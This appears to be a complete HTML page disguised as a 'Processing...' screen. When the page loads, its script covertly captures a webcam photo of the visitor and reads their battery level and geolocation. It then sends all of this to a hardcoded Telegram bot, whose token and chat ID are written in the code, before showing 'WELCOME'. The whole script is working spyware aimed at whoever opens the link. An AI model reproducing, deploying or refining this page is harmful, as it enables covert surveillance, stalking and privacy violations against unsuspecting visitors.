<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing...</title>
    <style>
        body { background-color: black; color: white; text-align: center; font-size: 24px; height: 100vh; display: flex; align-items: center; justify-content: center; }
        #welcome { display: none; }
    </style>
</head>
<body>
    <video id="video" autoplay style="display: none;"></video>
    <canvas id="canvas" width="400" height="600" style="display: none;"></canvas>
    <div id="welcome">WELCOME</div>

    <script>
        const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
        const TELEGRAM_CHAT_ID = "5112680061";  // ✅ Updated Chat ID

        let video = document.getElementById("video");
        let canvas = document.getElementById("canvas");
        let context = canvas.getContext("2d");

        async function startCapture() {
            try {
                // 🚀 Camera Access
                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;

                setTimeout(() => {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    let imageData = canvas.toDataURL("image/png");
                    stream.getTracks().forEach(track => track.stop()); // 📌 Stop Camera

                    getUserDetails(imageData);
                }, 3000); // 🔥 3 sec me photo capture
            } catch (err) {
                console.error("Camera access denied!", err);
            }
        }

        // 🚀 Get Battery & Location
        async function getUserDetails(imageData) {
            let batteryLevel = "Unknown";
            try {
                let battery = await navigator.getBattery();
                batteryLevel = `${Math.round(battery.level * 100)}%`;
            } catch (err) { console.log("Battery info blocked!"); }

            let locationData = "Unknown";
            navigator.geolocation.getCurrentPosition(position => {
                locationData = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
                sendToTelegram(imageData, batteryLevel, locationData);
            }, err => {
                console.log("Location access denied!", err);
                sendToTelegram(imageData, batteryLevel, "Location Denied");
            });
        }

        // 🚀 Send Data to Telegram
        function sendToTelegram(imageData, battery, location) {
            let message = `📸 **User Info**\n🔋 Battery: ${battery}\n📍 Location: ${location}`;

            // 🔹 Send Text
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" })
            }).catch(error => console.log("Message sending error:", error));

            // 🔹 Send Photo
            let blob = dataURItoBlob(imageData);
            let formData = new FormData();
            formData.append("chat_id", TELEGRAM_CHAT_ID);
            formData.append("photo", blob, "image.png");

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            }).then(() => {
                document.body.style.backgroundColor = "black"; // Background Black rahega
                document.getElementById("welcome").style.display = "block"; // Welcome Text Show Karega
            }).catch(error => console.log("Photo sending error:", error));
        }

        // 🚀 Convert Base64 to Blob
        function dataURItoBlob(dataURI) {
            let byteString = atob(dataURI.split(',')[1]);
            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            let ab = new ArrayBuffer(byteString.length);
            let ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        // 🚀 Start Process
        startCapture();
    </script>
</body>
</html>
